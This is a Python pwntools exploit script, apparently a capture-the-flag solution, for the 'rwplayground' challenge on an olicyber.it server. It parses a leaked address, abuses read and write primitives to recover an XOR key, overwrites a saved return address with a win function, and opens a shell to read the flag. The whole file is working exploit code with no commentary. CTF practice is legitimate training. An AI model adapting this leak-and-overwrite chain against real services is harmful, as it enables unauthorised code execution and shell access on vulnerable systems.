from pwn import *
import re

elf = context.binary = ELF("rwplayground", False)
p = remote("rwplayground.challs.olicyber.it", 38051)

o = p.recvuntil(b"> ")

leak = int(re.search(br"(0x[0-9a-fA-F]+)", o).group(1), 16)
ret = leak + 0x14

read_key_addr = 0x4040b0
write_key_addr = 0x4040b8
win_addr = 0x401397
zero_addr = write_key_addr + 0x8

p.sendline(b"1")
p.recvuntil(b"where: ")
p.sendline(hex(zero_addr).encode())

o = p.recvuntil(b"> ")
read_key = int(re.search(br"value: (0x[0-9a-fA-F]+)", o).group(1), 16)

p.sendline(b"1")
p.recvuntil(b"where: ")
p.sendline(hex(write_key_addr).encode())

o = p.recvuntil(b"> ")
write_key_enc = int(re.search(br"value: (0x[0-9a-fA-F]+)", o).group(1), 16)

write_key = write_key_enc ^ read_key

payload = win_addr ^ write_key

p.sendline(b"2")
p.recvuntil(b"where: ")
p.sendline(hex(ret).encode())
p.recvuntil(b"what: ")
p.sendline(hex(payload).encode())

p.recvuntil(b"> ")
p.sendline(b"4")

p.sendline(b"cat flag")
p.interactive() #shell :)